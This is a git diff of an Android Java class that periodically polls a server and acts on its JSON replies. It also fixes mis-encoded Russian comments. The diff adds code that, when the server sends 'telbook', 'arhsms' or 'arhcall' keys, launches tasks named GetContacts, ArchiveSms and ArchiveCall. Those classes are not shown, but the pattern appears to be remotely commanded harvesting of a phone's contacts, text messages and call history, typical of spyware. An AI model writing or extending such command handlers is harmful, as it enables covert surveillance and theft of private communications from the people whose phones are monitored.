@@ -3,19 +3,23 @@ package com.inet.android.request;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import com.inet.android.bs.Caller;
-import com.inet.android.utils.Logging;
-
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
+import com.inet.android.archive.ArchiveCall;
+import com.inet.android.archive.ArchiveSms;
+import com.inet.android.bs.Caller;
+import com.inet.android.contacts.GetContacts;
+import com.inet.android.utils.Logging;
+
 /**
  * Periodic request class
+ * 
  * @author johny homicide
- *
+ * 
  */
 public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = "PeriodicRequest";
@@ -53,12 +57,12 @@ public class PeriodicRequest extends DefaultRequest {
 
 	@Override
 	protected void sendPostRequest(String request) {
-		String str = Caller.doMake(request, "periodic");
+		String str = Caller.doMake(request, "periodic", ctx);
 		if (str != null) {
 			getRequestData(str);
 		} else {
-			Logging.doLog(LOG_TAG, "îòâåòà îò ñåðâåðà íåò èëè îí íåêîððåêòåí",
-					"îòâåòà îò ñåðâåðà íåò èëè îí íåêîððåêòåí");
+			Logging.doLog(LOG_TAG, "ответа от сервера нет или он некорректен",
+					"ответа от сервера нет или он некорректен");
 			SharedPreferences sp = PreferenceManager
 					.getDefaultSharedPreferences(ctx);
 			Editor ed = sp.edit();
@@ -70,7 +74,8 @@ public class PeriodicRequest extends DefaultRequest {
 
 	@Override
 	protected void getRequestData(String response) {
-		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);
+		Logging.doLog(LOG_TAG, "getResponseData: " + response,
+				"getResponseData: " + response);
 
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
@@ -95,21 +100,21 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("code", "");
 		}
 
-		// ðåæèì îæèäàíèÿ ïðèíÿòèÿ ðåøåíèÿ
+		// режим ожидания принятия решения
 		if (str.equals("1")) {
 			ed.putString("period", "1");
 			ed.commit();
 			return;
 		}
 
-		// ïåðåõîä â ïàññèâíûé ðåæèì ðàáîòû 
+		// переход в пассивный режим работы
 		if (str.equals("3")) {
 			ed.putString("period", "10");
 			ed.commit();
 			return;
 		}
 
-		// îøèáêè
+		// ошибки
 		if (str.equals("0")) {
 			String errstr = null;
 			try {
@@ -126,9 +131,10 @@ public class PeriodicRequest extends DefaultRequest {
 			return;
 		}
 
-		// àêòèâíûé ðåæèì ðàáîòû
+		// активный режим работы
 		if (str.equals("2")) {
 			ed.putString("period", "1");
+			
 		}
 
 		try {
@@ -182,6 +188,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("telbook", str);
+			GetContacts getCont = new GetContacts();
+			getCont.execute(ctx);
 		} else {
 			ed.putString("telbook", "0");
 		}
@@ -199,11 +207,14 @@ public class PeriodicRequest extends DefaultRequest {
 
 		try {
 			str = jsonObject.getString("arhsms");
+
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
 			ed.putString("arhsms", str);
+			ArchiveSms arhSms = new ArchiveSms();
+			arhSms.execute(ctx);
 		} else {
 			ed.putString("arhsms", "0");
 		}
@@ -215,6 +226,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("arhcall", str);
+			ArchiveCall arhCall = new ArchiveCall();
+			arhCall.execute(ctx);
 		} else {
 			ed.putString("arhcall", "0");
 		}
